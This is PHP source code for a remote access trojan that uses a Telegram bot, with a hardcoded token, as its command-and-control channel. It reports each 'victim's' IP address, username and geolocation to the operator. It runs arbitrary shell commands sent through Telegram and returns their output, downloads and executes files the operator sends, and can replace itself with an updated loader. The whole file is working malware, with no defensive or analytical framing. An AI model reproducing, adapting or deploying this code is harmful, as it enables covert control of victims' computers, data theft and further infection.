<?php
	$token = "1890022073:AAE0LH6j2QTwMC5YAwym-HrhohtQzUXc9JY";
	$chat_id = "1742761281";
	function Request($url){
		$command = "cmd.exe /c curl.exe \"" . $url . "\" -s -k > C:\Users\Public\output.txt";
		system($command);
		return file_get_contents("C:\Users\Public\output.txt");
	}
	$json = $json = json_decode(Request('http://ip-api.com/json/'),true);
	$ip = $json['query'];
	set_time_limit(3600 * 24);
	$progrm = $argv[1];
	if(file_exists("C:\Users\Public\old.txt")){
		Request('https://api.telegram.org/bot' . $token . '/sendMessage?text=' . urlencode("😈 Online Victim : \n ❖ IP Address : " . $ip . "\n ❖ Program Name : " . $progrm . "\n ❖ Username : " . get_current_user()) . "&chat_id=" . $chat_id);
	}
	else{
		Request('https://api.telegram.org/bot' . $token . '/sendMessage?text=' . urlencode("😈 New Victim : \n ❖ IP Address : " . $ip . "\n ❖ Program Name : " . $progrm . "\n ❖ Username : " . get_current_user()) . "&chat_id=" . $chat_id);
		$file = fopen("C:\Users\Public\old.txt", "w");
	}
	$json = json_decode(Request('https://api.telegram.org/bot' . $token . '/getUpdates'),true);
	$old_date = end($json['result'])['message']['date'];
	while(true){
		$json = json_decode(Request('https://api.telegram.org/bot' . $token . '/getUpdates'),true);
		$message = end($json['result'])['message'];
		$new_date = $message['date'];
		if($old_date != $new_date){
			$old_date = $new_date;
			if(isset($message['text'])){
				$command = explode(" ", $message['text'])[0];
				if ($command == "/list")
				{
					Request('https://api.telegram.org/bot' . $token . '/sendMessage?text=' . urlencode("😈 Online Victim : \n ❖ IP Address : " . $ip . "\n ❖ Program Name : " . $progrm . "\n ❖ Username : " . get_current_user()) . "&chat_id=" . $chat_id);
				}
				elseif($command == "/geo" AND in_array(end(explode(" ",$message['text'])), array($ip, get_current_user(), "All"))){
					$json = json_decode(Request('http://ip-api.com/json/'),true);
					$message = "🌎 Geo Location : \n";
					$message .= "❖ IP : " . $json['query'] . "\n";
					$message .= "❖ Country : " . $json['country'] . "\n";
					$message .= "❖ City : " . $json['city'] . "\n";
					$message .= "❖ Region Name : " . $json['regionName'] . "\n";
					$message .= "❖ Country Code : " . $json['countryCode'] . "\n";
					$message .= "❖ Time Zone : " . $json['timezone'] . "\n";
					$message .= "❖ MAP : http://extreme-ip-lookup.com/" . $json['query'] . "\n";
					$message .= "--" . get_current_user() . "--";
					Request('https://api.telegram.org/bot' . $token . '/sendMessage?text='. urlencode($message) . '&chat_id=' . $chat_id);
				}
				elseif($command == "/close" AND in_array(end(explode(" ",$message['text'])), array($ip, get_current_user(), "All"))){
					exit;
				}
				elseif($command == "/uname" AND in_array(end(explode(" ",$message['text'])), array($ip, get_current_user(), "All"))){
					Request('https://api.telegram.org/bot' . $token . '/sendMessage?text=' . urlencode('📌 ' . php_uname() . "\n--" . get_current_user() . "--") . '&chat_id=' . $chat_id);
				}
				elseif($command == "/restart" AND in_array(end(explode(" ",$message['text'])), array($ip, get_current_user(), "All"))){
					exec("cmd.exe /c taskkill /F /IM php.exe & C:\Windows\php\Main.vbs");
					exit;
				}
				elseif($command == "/execute" AND in_array(end(explode(" ",$message['text'])), array($ip, get_current_user(), "All"))){
						$spl = explode(" ",$message['text']);
						unset($spl[0]);
						array_pop($spl);
						exec(join(" ",$spl) . " 2>&1", $output);
						$output = join("\n",$output);
						Request('https://api.t]elegram.org/bot' . $token . '/sendMessage?text=' . urlencode("✔️ Command Executed \n-- " . get_current_user() . "--") . '&chat_id=' . $chat_id);
						if($output != ""){
							Request('https://api.telegram.org/bot' . $token . '/sendMessage?text=' . urlencode("📌 Output : \n" . $output . "\n--" . get_current_user() . "--") . '&chat_id=' . $chat_id);

						}

				}
			}
			else{
				$file_id = $message['document']['file_id'];
				$caption = $message['caption'];
				if (in_array($caption,array($ip, get_current_user(), "All"))){
					$json = json_decode(Request("https://api.telegram.org/bot" . $token . "/getFile?file_id=" . $file_id),true);
					$link = $json['result']['file_path'];
					$link = "https://api.telegram.org/file/bot" . $token . "/" . $link;
					$output = "C:\\Users\\" . get_current_user() . "\\AppData\\Local\\Temp\\" . rand(1,9999) . "." . end(explode(".", $json['result']['file_path']));
					echo $link;
					file_put_contents($output,Request($link));
					Request('https://api.telegram.org/bot' . $token . '/sendMessage?text=' . urlencode("✔️ File Downlaoded And Executed \n-- " . get_current_user() . "--") . '&chat_id=' . $chat_id);
					system("explorer.exe " . $output);
				}
				elseif(in_array($caption,array($ip, get_current_user(), "All")) AND strpos($caption, "Update") !== false){
					$json = json_decode(Request("https://api.telegram.org/bot" . $token . "/getFile?file_id=" . $file_id),true);
					$link = $json['result']['file_path'];
					$link = "https://api.telegram.org/file/bot" . $token . "/" . $link;
					$output = "C:\\Users\\" . get_current_user() . "\\AppData\\Local\\Temp\\" . rand(1,9999) . "." . end(explode(".", $json['result']['file_path']));
					file_put_contents(dirname(__FILE__) . "\index.php",Request($link));
					Request('https://api.telegram.org/bot' . $token . '/sendMessage?text=' . urlencode("✔️ PHP Loader Script Updated \n-- " . get_current_user() . "--") . '&chat_id=' . $chat_id);
					system(dirname(__FILE__) . "\php.exe " . dirname(__FILE__) . "\index.php");
					exit;
				}
			}
		}
	}
?>